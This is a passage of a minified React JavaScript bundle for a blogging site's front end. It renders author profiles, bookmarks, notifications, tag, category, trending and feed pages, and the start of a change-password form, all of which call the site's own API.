${r?"text-gray-900":"text-gray-400"}`,title:r?"Remove bookmark":"Bookmark this post",children:o.jsx(_u,{className:`w-5 h-5 ${r?"fill-current":""}`})}),o.jsx("button",{onClick:m=>{m.preventDefault(),m.stopPropagation()},className:"p-2 rounded-full transition-all hover:bg-gray-100 text-gray-400",title:"More options",children:o.jsx(b_,{className:"w-5 h-5"})})]})]}),e.tags&&e.tags.length>0&&o.jsxs("div",{className:"flex flex-wrap gap-2 mt-3",children:[e.tags.slice(0,5).map(m=>o.jsxs(we,{to:`/tag/${m.slug||m.name}`,onClick:x=>x.stopPropagation(),className:"px-2 py-1 bg-gray-100 text-gray-600 text-xs rounded-full hover:bg-gray-200 transition-colors",children:["#",m.name||m]},m.id||m.name)),e.tags.length>5&&o.jsxs("span",{className:"px-2 py-1 text-gray-400 text-xs",children:["+",e.tags.length-5]})]})]}),e.coverImageUrl&&o.jsx("div",{className:"w-40 h-40 flex-shrink-0",children:o.jsx("img",{src:e.coverImageUrl,alt:e.title,className:"w-full h-full object-cover rounded-sm"})})]})})})}function XB(){var A;const{username:e}=Vu(),{user:t}=Gt(),[n,r]=j.useState(null),[a,l]=j.useState([]),[u,f]=j.useState(!0),[h,m]=j.useState(0),[x,g]=j.useState(0),[b,E]=j.useState("home"),{followersCount:C,followingCount:P,isOwnProfile:O}=Zg(e);j.useEffect(()=>{N(),T()},[e,h]);const N=async()=>{try{const _=await _e.get(`/api/users/${e}`);r(_.data)}catch(_){console.error("Failed to fetch author:",_)}},T=async()=>{try{f(!0);const _=await _e.get("/api/posts",{params:{author:e,status:"PUBLISHED",page:h,size:10,sort:"publishedAt,desc"}});l(_.data.content||[]),g(_.data.totalPages||0)}catch(_){console.error("Failed to fetch posts:",_)}finally{f(!1)}};return n?o.jsx("div",{className:"min-h-screen bg-white",children:o.jsx("div",{className:"max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8",children:o.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-3 gap-8",children:[o.jsx("div",{className:"lg:col-span-1 order-1 lg:order-2",children:o.jsxs("div",{className:"lg:sticky lg:top-8",children:[o.jsxs("div",{className:"text-center mb-6",children:[n.avatarUrl?o.jsx("img",{src:n.avatarUrl,alt:n.displayName,className:"w-24 h-24 rounded-full object-cover mx-auto mb-4 border-2 border-gray-200"}):o.jsx("div",{className:"w-24 h-24 rounded-full bg-gray-200 flex items-center justify-center mx-auto mb-4 text-3xl font-bold text-gray-600",children:((A=n.displayName)==null?void 0:A.charAt(0))||"U"}),o.jsx("h2",{className:"text-xl font-bold text-gray-900 mb-1",children:n.displayName}),o.jsxs("p",{className:"text-gray-500 text-sm mb-4",children:[a.length," ",a.length===1?"Story":"Stories"]}),n.bio&&o.jsx("p",{className:"text-gray-600 text-sm mb-4",children:n.bio}),o.jsxs("div",{className:"flex justify-center gap-6 text-sm mb-4 border-t border-b border-gray-100 py-3",children:[o.jsxs("div",{className:"text-center",children:[o.jsx("span",{className:"block font-bold text-gray-900",children:C}),o.jsx("span",{className:"text-gray-500",children:"Followers"})]}),o.jsxs("div",{className:"text-center",children:[o.jsx("span",{className:"block font-bold text-gray-900",children:P}),o.jsx("span",{className:"text-gray-500",children:"Following"})]})]})]}),o.jsx("div",{className:"bg-gray-50 rounded-lg p-4 mb-4",children:o.jsxs("div",{className:"space-y-3",children:[n.email&&o.jsxs("div",{className:"flex items-center gap-2 text-sm text-gray-600",children:[o.jsx(Nl,{className:"h-4 w-4"}),o.jsx("span",{className:"truncate",children:n.email})]}),o.jsxs("div",{className:"flex items-center gap-2 text-sm text-gray-600",children:[o.jsx(Zu,{className:"h-4 w-4"}),o.jsxs("span",{children:["Joined ",Ui(new Date(n.createdAt||new Date),"MMM yyyy")]})]})]})}),!O&&o.jsx(Uf,{username:e,size:"lg",className:"w-full mb-4"}),O&&o.jsx(we,{to:"/profile",className:"block",children:o.jsxs(Ee,{variant:"outline",className:"w-full gap-2",children:[o.jsx(ec,{className:"h-4 w-4"}),"Edit Profile"]})}),o.jsx("div",{className:"text-center text-sm text-gray-500 mt-4 hidden lg:block",children:o.jsx("p",{children:"More from this author coming soon..."})})]})}),o.jsxs("div",{className:"lg:col-span-2 order-2 lg:order-1",children:[o.jsx("div",{className:"mb-8",children:o.jsx("h1",{className:"text-4xl font-bold text-gray-900",children:n.displayName})}),o.jsx("div",{className:"border-b border-gray-200 mb-6",children:o.jsxs("nav",{className:"-mb-px flex space-x-8",children:[o.jsx("button",{onClick:()=>E("home"),className:`${b==="home"?"border-gray-900 text-gray-900":"border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300"} border-b-2 py-4 px-1 text-sm font-medium transition-colors`,children:"Home"}),o.jsx("button",{onClick:()=>E("about"),className:`${b==="about"?"border-gray-900 text-gray-900":"border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300"} border-b-2 py-4 px-1 text-sm font-medium transition-colors`,children:"About"})]})}),b==="home"?o.jsxs(o.Fragment,{children:[u?o.jsx("div",{className:"text-center py-12",children:o.jsx("div",{className:"inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-gray-900"})}):a.length===0?o.jsx("div",{className:"text-center py-12",children:o.jsx("p",{className:"text-gray-500",children:"No posts yet."})}):o.jsx("div",{className:"space-y-8",children:a.map(_=>o.jsx(oc,{post:_},_.id))}),x>1&&o.jsxs("div",{className:"flex justify-center gap-2 mt-8 pt-8 border-t",children:[o.jsx(Ee,{variant:"outline",onClick:()=>{m(_=>Math.max(0,_-1)),window.scrollTo({top:0,behavior:"smooth"})},disabled:h===0,children:"Previous"}),o.jsxs("span",{className:"flex items-center px-4 text-gray-700",children:[h+1," / ",x]}),o.jsx(Ee,{variant:"outline",onClick:()=>{m(_=>Math.min(x-1,_+1)),window.scrollTo({top:0,behavior:"smooth"})},disabled:h>=x-1,children:"Next"})]})]}):o.jsxs("div",{className:"prose max-w-none",children:[o.jsxs("h2",{children:["About ",n.displayName]}),n.about?o.jsx("div",{className:"whitespace-pre-wrap",children:n.about}):o.jsx("p",{className:"text-gray-500",children:"No about section yet."})]})]})]})})}):o.jsx("div",{className:"min-h-screen bg-gray-50 flex items-center justify-center",children:o.jsxs("div",{className:"text-center",children:[o.jsx("div",{className:"inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"}),o.jsx("p",{className:"mt-4 text-gray-600",children:"Loading profile..."})]})})}function ZB(){const{user:e}=Gt(),[t,n]=j.useState([]),[r,a]=j.useState(!0),[l,u]=j.useState(0),[f,h]=j.useState(0);j.useEffect(()=>{e&&m()},[e,l]);const m=async()=>{try{a(!0);const x=await qB(l,10);n(x.content),h(x.totalPages)}catch(x){console.error("Failed to load bookmarks:",x)}finally{a(!1)}};return e?r&&l===0?o.jsx("div",{className:"min-h-screen bg-gray-50 flex items-center justify-center",children:o.jsxs("div",{className:"text-center",children:[o.jsx("div",{className:"inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"}),o.jsx("p",{className:"mt-4 text-gray-600",children:"Loading bookmarks..."})]})}):o.jsx("div",{className:"min-h-screen bg-gray-50 py-8",children:o.jsxs("div",{className:"container mx-auto px-4 max-w-5xl",children:[o.jsxs("div",{className:"mb-8",children:[o.jsx("h1",{className:"text-3xl font-bold text-gray-900 mb-2",children:"My Bookmarks"}),o.jsx("p",{className:"text-gray-600",children:"Posts you've saved for later"})]}),t.length===0?o.jsxs("div",{className:"bg-white rounded-lg shadow-sm p-12 text-center",children:[o.jsx(_u,{className:"h-16 w-16 mx-auto text-gray-400 mb-4"}),o.jsx("h2",{className:"text-xl font-semibold text-gray-700 mb-2",children:"No bookmarks yet"}),o.jsx("p",{className:"text-gray-500 mb-6",children:"Bookmark posts to save them for later reading"}),o.jsx(we,{to:"/",children:o.jsx(Ee,{children:"Explore Posts"})})]}):o.jsxs(o.Fragment,{children:[o.jsx("div",{className:"space-y-4",children:t.map(x=>o.jsx(Hf,{post:x},x.id))}),f>1&&o.jsxs("div",{className:"mt-8 flex justify-center gap-2",children:[o.jsx(Ee,{variant:"outline",disabled:l===0,onClick:()=>u(l-1),children:"Previous"}),o.jsxs("span",{className:"px-4 py-2 text-gray-600",children:["Page ",l+1," of ",f]}),o.jsx(Ee,{variant:"outline",disabled:l>=f-1,onClick:()=>u(l+1),children:"Next"})]})]})]})}):o.jsx("div",{className:"min-h-screen bg-gray-50 flex items-center justify-center",children:o.jsxs("div",{className:"text-center",children:[o.jsx("h2",{className:"text-2xl font-bold mb-4",children:"Please log in to view bookmarks"}),o.jsx(we,{to:"/login",children:o.jsx(Ee,{children:"Log In"})})]})})}function JB(){const[e,t]=j.useState([]),[n,r]=j.useState(!0),[a,l]=j.useState(0),[u,f]=j.useState(0);j.useEffect(()=>{h()},[a]);const h=async()=>{try{r(!0);const C=await _e.get("/api/notifications",{params:{page:a,size:20}});t(C.data.content),f(C.data.totalPages)}catch(C){console.error("Failed to fetch notifications:",C)}finally{r(!1)}},m=async C=>{try{await _e.post(`/api/notifications/${C}/read`),t(e.map(P=>P.id===C?{...P,read:!0}:P))}catch(P){console.error("Failed to mark as read:",P)}},x=async()=>{try{await _e.post("/api/notifications/read-all"),t(e.map(C=>({...C,read:!0})))}catch(C){console.error("Failed to mark all as read:",C)}},g=C=>{switch(C){case"LIKE":return o.jsx(cr,{className:"h-5 w-5 text-red-500 fill-current"});case"COMMENT":return o.jsx(cf,{className:"h-5 w-5 text-blue-500 fill-current"});case"FOLLOW":return o.jsx(Xg,{className:"h-5 w-5 text-green-500"});default:return o.jsx("div",{className:"h-5 w-5 bg-gray-200 rounded-full"})}},b=C=>{const P=C.actorName||"Someone";switch(C.type){case"LIKE":return o.jsxs("span",{children:[o.jsx("span",{className:"font-semibold text-gray-900",children:P})," liked your post."]});case"COMMENT":return o.jsxs("span",{children:[o.jsx("span",{className:"font-semibold text-gray-900",children:P})," commented on your post."]});case"FOLLOW":return o.jsxs("span",{children:[o.jsx("span",{className:"font-semibold text-gray-900",children:P})," started following you."]});default:return"New notification"}},E=C=>C.type==="FOLLOW"?`/author/${C.actorUsername}`:`/post/${C.entityId}`;return o.jsx("div",{className:"min-h-screen bg-gray-50 py-8",children:o.jsxs("div",{className:"max-w-3xl mx-auto px-4 sm:px-6 lg:px-8",children:[o.jsxs("div",{className:"flex items-center justify-between mb-6",children:[o.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"Notifications"}),o.jsx(Ee,{variant:"outline",size:"sm",onClick:x,children:"Mark all as read"})]}),o.jsx("div",{className:"bg-white rounded-lg shadow-sm overflow-hidden",children:n?o.jsx("div",{className:"p-8 text-center",children:o.jsx("div",{className:"inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"})}):e.length===0?o.jsx("div",{className:"p-8 text-center text-gray-500",children:"No notifications yet."}):o.jsx("div",{className:"divide-y divide-gray-100",children:e.map(C=>o.jsx("div",{className:`p-4 hover:bg-gray-50 transition-colors ${C.read?"":"bg-blue-50/50"}`,onClick:()=>!C.read&&m(C.id),children:o.jsxs("div",{className:"flex gap-4",children:[o.jsx("div",{className:"flex-shrink-0 mt-1",children:g(C.type)}),o.jsxs(we,{to:E(C),className:"flex-1 min-w-0 block",children:[o.jsx("p",{className:"text-sm text-gray-600 mb-1",children:b(C)}),o.jsx("p",{className:"text-xs text-gray-400",children:Ui(new Date(C.createdAt),"MMM dd, yyyy  h:mm a")})]})]})},C.id))})}),u>1&&o.jsxs("div",{className:"flex justify-center gap-2 mt-6",children:[o.jsx(Ee,{variant:"outline",onClick:()=>l(C=>Math.max(0,C-1)),disabled:a===0,children:"Previous"}),o.jsxs("span",{className:"flex items-center px-4 text-gray-700",children:["Page ",a+1," of ",u]}),o.jsx(Ee,{variant:"outline",onClick:()=>l(C=>Math.min(u-1,C+1)),disabled:a>=u-1,children:"Next"})]})]})})}function e7(){return o.jsx("div",{className:"container mx-auto px-4 py-24",children:o.jsxs("div",{className:"max-w-md mx-auto text-center",children:[o.jsx("h1",{className:"text-9xl font-bold text-primary mb-4",children:"404"}),o.jsx("h2",{className:"text-3xl font-semibold mb-4",children:"Page Not Found"}),o.jsx("p",{className:"text-muted-foreground mb-8",children:"The page you're looking for doesn't exist or has been moved."}),o.jsx(Ee,{asChild:!0,size:"lg",children:o.jsx(we,{to:"/",children:"Go Back Home"})})]})})}function t7(){const{slug:e}=Vu(),{isAuthenticated:t}=Gt(),[n,r]=j.useState([]),[a,l]=j.useState(!0),[u,f]=j.useState(0),[h,m]=j.useState(0),[x,g]=j.useState(0),[b,E]=j.useState(null);j.useEffect(()=>{C()},[e]),j.useEffect(()=>{P()},[e,u]);const C=async()=>{try{const N=(await _e.get("/api/tags",{params:{query:e}})).data.find(T=>T.slug===e||T.name.toLowerCase()===e.toLowerCase());E(N)}catch(O){console.error("Failed to fetch tag info:",O)}},P=async()=>{try{l(!0);const O=await _e.get("/api/posts",{params:{tagSlug:e,page:u,size:10,sort:"publishedAt,desc"}});r(O.data.content),m(O.data.totalPages),g(O.data.totalElements)}catch(O){console.error("Failed to fetch posts:",O)}finally{l(!1)}};return o.jsxs("div",{className:"min-h-screen bg-white",children:[o.jsx("div",{className:"border-b border-gray-200 bg-gradient-to-r from-gray-50 to-white",children:o.jsx("div",{className:"max-w-4xl mx-auto px-6 py-12",children:o.jsxs("div",{className:"flex items-center gap-4 mb-4",children:[o.jsx("div",{className:"p-3 bg-gray-900 rounded-xl",children:o.jsx(E0,{className:"h-8 w-8 text-white"})}),o.jsxs("div",{children:[o.jsxs("h1",{className:"text-4xl font-bold text-gray-900",children:["#",(b==null?void 0:b.name)||e]}),o.jsxs("p",{className:"text-gray-600 mt-1",children:[x," ",x===1?"story":"stories"]})]})]})})}),o.jsx("div",{className:"max-w-4xl mx-auto px-6 py-8",children:a?o.jsx("div",{className:"text-center py-12",children:o.jsx("div",{className:"inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-gray-900"})}):n.length===0?o.jsxs("div",{className:"text-center py-12",children:[o.jsx(E0,{className:"h-16 w-16 text-gray-300 mx-auto mb-4"}),o.jsx("p",{className:"text-gray-500 text-lg mb-4",children:"No posts with this tag yet."}),t&&o.jsx(we,{to:"/write",children:o.jsx(Ee,{children:"Write a Story"})})]}):o.jsxs(o.Fragment,{children:[o.jsx("div",{className:"space-y-8",children:n.map(O=>o.jsx(oc,{post:O},O.id))}),h>1&&o.jsxs("div",{className:"flex justify-center gap-2 mt-12 pt-8 border-t",children:[o.jsx(Ee,{variant:"outline",onClick:()=>{f(O=>Math.max(0,O-1)),window.scrollTo({top:0,behavior:"smooth"})},disabled:u===0,children:"Previous"}),o.jsxs("span",{className:"flex items-center px-4 text-gray-700",children:[u+1," / ",h]}),o.jsx(Ee,{variant:"outline",onClick:()=>{f(O=>Math.min(h-1,O+1)),window.scrollTo({top:0,behavior:"smooth"})},disabled:u>=h-1,children:"Next"})]})]})})]})}function n7(){const{slug:e}=Vu(),[t,n]=j.useState(null),[r,a]=j.useState([]),[l,u]=j.useState(!0),[f,h]=j.useState(0),[m,x]=j.useState(0),[g,b]=j.useState(0),[E,C]=j.useState("latest");j.useEffect(()=>{P()},[e]),j.useEffect(()=>{t&&O()},[t,f,E]);const P=async()=>{try{const T=await _e.get(`/api/categories/slug/${e}`);n(T.data)}catch(T){console.error("Failed to fetch category:",T);try{const _=(await _e.get("/api/categories")).data.find(M=>M.slug===e||M.name.toLowerCase()===e.toLowerCase());_&&n(_)}catch(A){console.error("Failed to find category:",A)}}},O=async()=>{if(t){u(!0);try{let T="publishedAt,desc";E==="views"?T="views,desc":E==="likes"?T="likesCount,desc":E==="trending"&&(T="views,desc");const A=await _e.get("/api/posts",{params:{categoryId:t.id,page:f,size:10,sort:T}});a(A.data.content||[]),x(A.data.totalPages),b(A.data.totalElements)}catch(T){console.error("Failed to fetch posts:",T)}finally{u(!1)}}},N=T=>{const A=["from-blue-500 to-purple-600","from-green-500 to-teal-600","from-orange-500 to-red-600","from-pink-500 to-rose-600","from-indigo-500 to-blue-600","from-yellow-500 to-orange-600","from-cyan-500 to-blue-600","from-violet-500 to-purple-600"],_=(T==null?void 0:T.charCodeAt(0))%A.length||0;return A[_]};return!t&&!l?o.jsx("div",{className:"min-h-screen bg-gray-50 flex items-center justify-center",children:o.jsxs("div",{className:"text-center",children:[o.jsx(xl,{className:"h-16 w-16 text-gray-300 mx-auto mb-4"}),o.jsx("h2",{className:"text-2xl font-bold text-gray-900 mb-2",children:"Category Not Found"}),o.jsx("p",{className:"text-gray-500 mb-4",children:"The category you're looking for doesn't exist."}),o.jsx(we,{to:"/",children:o.jsxs(Ee,{children:[o.jsx(Fi,{className:"h-4 w-4 mr-2"}),"Back to Home"]})})]})}):o.jsxs("div",{className:"min-h-screen bg-gray-50",children:[o.jsxs("div",{className:`relative ${t!=null&&t.coverImageUrl?"":`bg-gradient-to-r ${N(t==null?void 0:t.name)}`}`,style:t!=null&&t.coverImageUrl?{backgroundImage:`url(${t.coverImageUrl})`,backgroundSize:"cover",backgroundPosition:"center"}:{},children:[o.jsx("div",{className:`absolute inset-0 ${t!=null&&t.coverImageUrl?"bg-black/50":"bg-black/30"}`}),o.jsxs("div",{className:"max-w-7xl mx-auto px-6 py-16 relative",children:[o.jsxs(we,{to:"/",className:"inline-flex items-center gap-2 text-white/80 hover:text-white mb-4 transition-colors",children:[o.jsx(Fi,{className:"h-4 w-4"}),"Back to Home"]}),o.jsxs("div",{className:"flex items-center gap-3 mb-2",children:[o.jsx(xl,{className:"h-8 w-8 text-white"}),o.jsx("span",{className:"text-white/80 text-lg",children:"Topic"})]}),o.jsx("h1",{className:"text-4xl md:text-5xl font-bold text-white mb-4",children:(t==null?void 0:t.name)||"Loading..."}),(t==null?void 0:t.description)&&o.jsx("p",{className:"text-white/90 text-lg max-w-2xl mb-4",children:t.description}),o.jsxs("div",{className:"flex items-center gap-2 text-white/80",children:[o.jsx(Xr,{className:"h-5 w-5"}),o.jsxs("span",{className:"text-lg",children:[g," ",g===1?"post":"posts"]})]})]})]}),o.jsxs("div",{className:"max-w-7xl mx-auto px-6 py-8",children:[o.jsx("div",{className:"bg-white rounded-lg shadow-sm mb-6",children:o.jsxs("div",{className:"flex border-b overflow-x-auto",children:[o.jsxs("button",{onClick:()=>{C("latest"),h(0)},className:`flex items-center gap-2 px-5 py-3 text-sm font-medium whitespace-nowrap transition-colors ${E==="latest"?"text-blue-600 border-b-2 border-blue-600":"text-gray-500 hover:text-gray-700"}`,children:[o.jsx(Yg,{className:"h-4 w-4"}),"Latest"]}),o.jsxs("button",{onClick:()=>{C("views"),h(0)},className:`flex items-center gap-2 px-5 py-3 text-sm font-medium whitespace-nowrap transition-colors ${E==="views"?"text-blue-600 border-b-2 border-blue-600":"text-gray-500 hover:text-gray-700"}`,children:[o.jsx(kn,{className:"h-4 w-4"}),"Most Viewed"]}),o.jsxs("button",{onClick:()=>{C("likes"),h(0)},className:`flex items-center gap-2 px-5 py-3 text-sm font-medium whitespace-nowrap transition-colors ${E==="likes"?"text-blue-600 border-b-2 border-blue-600":"text-gray-500 hover:text-gray-700"}`,children:[o.jsx(cr,{className:"h-4 w-4"}),"Most Liked"]}),o.jsxs("button",{onClick:()=>{C("trending"),h(0)},className:`flex items-center gap-2 px-5 py-3 text-sm font-medium whitespace-nowrap transition-colors ${E==="trending"?"text-blue-600 border-b-2 border-blue-600":"text-gray-500 hover:text-gray-700"}`,children:[o.jsx(x0,{className:"h-4 w-4"}),"Trending"]})]})}),l?o.jsxs("div",{className:"text-center py-12",children:[o.jsx("div",{className:"inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"}),o.jsx("p",{className:"mt-4 text-gray-600",children:"Loading..."})]}):r.length===0?o.jsxs("div",{className:"bg-white rounded-lg shadow-sm p-12 text-center",children:[o.jsx(Xr,{className:"h-16 w-16 text-gray-300 mx-auto mb-4"}),o.jsx("p",{className:"text-gray-500 text-lg",children:"No posts in this category yet"})]}):o.jsx("div",{className:"space-y-8",children:r.map(T=>o.jsx(oc,{post:T},T.id))}),m>1&&o.jsxs("div",{className:"flex justify-center gap-2 mt-8 pt-8 border-t",children:[o.jsx(Ee,{variant:"outline",onClick:()=>{h(T=>Math.max(0,T-1)),window.scrollTo({top:0,behavior:"smooth"})},disabled:f===0,children:"Previous"}),o.jsxs("span",{className:"flex items-center px-4 text-gray-700",children:[f+1," / ",m]}),o.jsx(Ee,{variant:"outline",onClick:()=>{h(T=>Math.min(m-1,T+1)),window.scrollTo({top:0,behavior:"smooth"})},disabled:f>=m-1,children:"Next"})]})]})]})}function r7(){const[e,t]=j.useState([]),[n,r]=j.useState(!0),[a,l]=j.useState(0),[u,f]=j.useState(0),[h,m]=j.useState(0);j.useEffect(()=>{x()},[a]);const x=async()=>{r(!0);try{const g=await _e.get("/api/posts/trending",{params:{page:a,size:10}});t(g.data.content||[]),f(g.data.totalPages||0),m(g.data.totalElements||0)}catch(g){console.error("Failed to fetch trending posts:",g)}finally{r(!1)}};return o.jsxs("div",{className:"min-h-screen bg-gray-50",children:[o.jsx("div",{className:"bg-gradient-to-r from-orange-500 to-red-500",children:o.jsxs("div",{className:"max-w-7xl mx-auto px-6 py-12",children:[o.jsxs(we,{to:"/",className:"inline-flex items-center gap-2 text-white/80 hover:text-white mb-4 transition-colors",children:[o.jsx(Fi,{className:"h-4 w-4"}),"Back to Home"]}),o.jsxs("div",{className:"flex items-center gap-3 mb-2",children:[o.jsx(ju,{className:"h-8 w-8 text-white"}),o.jsx("h1",{className:"text-4xl font-bold text-white",children:"Trending"})]}),o.jsxs("p",{className:"text-white/90 text-lg",children:[h," trending posts"]})]})}),o.jsx("div",{className:"max-w-5xl mx-auto px-6 py-8",children:n&&a===0?o.jsxs("div",{className:"text-center py-12",children:[o.jsx("div",{className:"inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-orange-500"}),o.jsx("p",{className:"mt-4 text-gray-600",children:"Loading..."})]}):e.length===0?o.jsxs("div",{className:"bg-white rounded-lg shadow-sm p-12 text-center",children:[o.jsx(ju,{className:"h-16 w-16 text-gray-300 mx-auto mb-4"}),o.jsx("p",{className:"text-gray-500 text-lg",children:"No trending posts yet"})]}):o.jsxs(o.Fragment,{children:[o.jsx("div",{className:"space-y-8",children:e.map(g=>o.jsx(oc,{post:g},g.id))}),u>1&&o.jsxs("div",{className:"flex justify-center gap-2 mt-8 pt-8 border-t",children:[o.jsx(Ee,{variant:"outline",onClick:()=>{l(g=>Math.max(0,g-1)),window.scrollTo({top:0,behavior:"smooth"})},disabled:a===0,children:"Previous"}),o.jsxs("span",{className:"flex items-center px-4 text-gray-700",children:[a+1," / ",u]}),o.jsx(Ee,{variant:"outline",onClick:()=>{l(g=>Math.min(u-1,g+1)),window.scrollTo({top:0,behavior:"smooth"})},disabled:a>=u-1,children:"Next"})]})]})})]})}function i7(){const{isAuthenticated:e}=Gt(),t=Ln(),[n,r]=j.useState([]),[a,l]=j.useState(!0),[u,f]=j.useState(0),[h,m]=j.useState(0),[x,g]=j.useState(0);j.useEffect(()=>{if(!e){t("/login");return}b()},[e,u]);const b=async()=>{l(!0);try{const E=await _e.get("/api/posts/feed",{params:{page:u,size:10}});r(E.data.content||[]),m(E.data.totalPages||0),g(E.data.totalElements||0)}catch(E){console.error("Failed to fetch feed posts:",E)}finally{l(!1)}};return e?o.jsxs("div",{className:"min-h-screen bg-gray-50",children:[o.jsx("div",{className:"bg-gradient-to-r from-blue-500 to-indigo-600",children:o.jsxs("div",{className:"max-w-7xl mx-auto px-6 py-12",children:[o.jsxs(we,{to:"/",className:"inline-flex items-center gap-2 text-white/80 hover:text-white mb-4 transition-colors",children:[o.jsx(Fi,{className:"h-4 w-4"}),"Back to Home"]}),o.jsxs("div",{className:"flex items-center gap-3 mb-2",children:[o.jsx(Mi,{className:"h-8 w-8 text-white"}),o.jsx("h1",{className:"text-4xl font-bold text-white",children:"From People You Follow"})]}),o.jsxs("p",{className:"text-white/90 text-lg",children:[x," posts from people you follow"]})]})}),o.jsx("div",{className:"max-w-5xl mx-auto px-6 py-8",children:a&&u===0?o.jsxs("div",{className:"text-center py-12",children:[o.jsx("div",{className:"inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500"}),o.jsx("p",{className:"mt-4 text-gray-600",children:"Loading..."})]}):n.length===0?o.jsxs("div",{className:"bg-white rounded-lg shadow-sm p-12 text-center",children:[o.jsx(Mi,{className:"h-16 w-16 text-gray-300 mx-auto mb-4"}),o.jsx("h2",{className:"text-xl font-semibold text-gray-700 mb-2",children:"No posts yet"}),o.jsx("p",{className:"text-gray-500 mb-6",children:"Follow some authors to see their posts here"}),o.jsx(we,{to:"/explore",children:o.jsx(Ee,{children:"Explore Authors"})})]}):o.jsxs(o.Fragment,{children:[o.jsx("div",{className:"space-y-8",children:n.map(E=>o.jsx(oc,{post:E},E.id))}),h>1&&o.jsxs("div",{className:"flex justify-center gap-2 mt-8 pt-8 border-t",children:[o.jsx(Ee,{variant:"outline",onClick:()=>{f(E=>Math.max(0,E-1)),window.scrollTo({top:0,behavior:"smooth"})},disabled:u===0,children:"Previous"}),o.jsxs("span",{className:"flex items-center px-4 text-gray-700",children:[u+1," / ",h]}),o.jsx(Ee,{variant:"outline",onClick:()=>{f(E=>Math.min(h-1,E+1)),window.scrollTo({top:0,behavior:"smooth"})},disabled:u>=h-1,children:"Next"})]})]})})]}):null}function a7(){const e=Ln(),[t,n]=j.useState(""),[r,a]=j.useState(""),[l,u]=j.useState(""),[f,h]=j.useState(!1),[m,x]=j.useState(!1),[g,b]=j.useState(!1),[E,C]=j.useState(!1),[P,O]=j.useState(!1),[N,T]=j.useState(""),A=async _=>{var M,R;if(_.preventDefault(),T(""),r!==l){T("New passwords do not match");return}if(r.length<6){T("New password must be at least 6 characters");return}if(t===r){T("New password must be different from current password");return}C(!0);try{await _e.post("/api/password/change",{currentPassword:t,newPassword:r}),O(!0)}catch(B){T(((R=(M=B.response)==null?void 0:M.data)==null?void 0:R.message)||"Failed to change password. Please try again.")}finally{C(!1)}};return P?o.jsx("div",{className:"min-h-screen bg-gray-50 flex items-center justify-center p-4",children:o.jsx("div",{className:"w-full max-w-md",children:o.jsxs("div",{className:"bg-white rounded-2xl shadow-xl p-8 text-center",children:[o.jsx("div",{className:"inline-flex items-center justify-center w-16 h-16 bg-green-100 rounded-full mb-6",children:o.jsx(Iu,{className:"h-8 w-8 text-green-600"})}),o.jsx("h1",{className:"text-2xl font-bold text-gray-900 mb-4",children:"Password Changed!"}),o.jsx("p",{className:"text-gray-600 mb-6",children:"Your password has been changed successfully."}),o.jsx(Ee,{onClick:()=>e("/profile"),className:"w-full",children:"Back to Profile"})]})})}):o.jsx("div",{className:"min-h-screen bg-gray-50 py-12 px-4",children:o.jsxs("div",{className:"max-w-md mx-auto",children:[o.jsxs(we,{to:"/profile",className:"inline-flex items-center gap-2 text-gray-600 hover:text-gray-900 mb-8 transition-colors",children:[o.jsx(Fi,{className:"h-4 w-4"}),"Back to Profile"]}),o.jsxs("div",{className:"bg-white rounded-2xl shadow-xl p-8",children:[o.jsxs("div",{className:"text-center mb-8",children:[o.jsx("div",{className:"inline-flex items-center justify-center w-16 h-16 bg-blue-100 rounded-full mb-4",children:o.jsx(ga,{className:"h-8 w-8 text-blue-600"})}),o.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"Change Password"}),o.jsx("p",{className:"text-gray-500 mt-2",children:"Enter your current password and choose a new one."})]}),N&&o.jsxs("div",{className:"mb-6 p-4 bg-red-50 border border-red-200 rounded-lg flex items-center gap-3 text-red-700",children:[o.jsx(Xu,{className:"h-5 w-5 flex-shrink-0"}),o.jsx("span",{className:"text-sm",children:N})]}),o.jsxs("form",{onSubmit:A,className:"space-y-5",children:[o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Current Password"}),o.jsxs("div",{className:"relative",children:[o.jsx(ga,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400"}),o.jsx("input",{type:f?"text":"password",value:t,onChange:_=>n(_.target.value),className:"w-full pl-10 pr-12 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent",placeholder:"",required:!0}),o.jsx("button",{type:"button",onClick:()=>h(!f),className:"absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600",children:f?o.jsx(gl,{className:"h-5 w-5"}):o.jsx(kn,{className:"h-5 w-5"})})]})]}),o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"New Password"}),o.jsxs("div",{className:"relative",children:[o.jsx(ga,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400"}),o.jsx("input",{type:m?"text":"password",value:r,onChange:_=>a(_.target.value),className:"w-full pl-10 pr-12 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent",placeholder:"",required:!0,minLength:6}),o.jsx("button",{type:"button",onClick:()=>x(!m),className:"absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600",children:m?o.jsx(gl,{className:"h-5 w-5"}):o.jsx(kn,{className:"h-5 w-5"})})]}),o.jsx("p",{className:"text-xs text-gray-500 mt-1",children:"Must be at least 6 characters"})]}),o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Confirm New Password"}),o.jsxs("div",{className:"relative",children:[o.jsx(ga,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400"}),o.jsx("input",{type:g?"text":"password",value:l,onChange:_=>u(_.target.value),className:"w-full pl-10 pr-12 py-3 border border-gray-300 rounded-lg focus:ring-2 